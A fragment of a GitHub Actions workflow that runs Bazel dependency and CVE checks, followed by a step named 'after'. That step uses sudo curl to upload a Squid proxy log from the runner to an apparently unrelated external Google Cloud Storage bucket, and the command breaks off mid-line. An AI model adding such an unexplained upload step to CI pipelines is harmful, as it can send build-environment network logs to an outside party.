        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      name: Run dependency checker
      run: 'TODAY_DATE=$(date -u -I"date")

        export TODAY_DATE

        bazel run --config=ci //tools/dependency:check --action_env=TODAY_DATE --
        -c release_issues --fix

        bazel run --config=ci //tools/dependency:check --action_env=TODAY_DATE --
        -c cves -w error

        '
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/freshworks/envoy.$(date
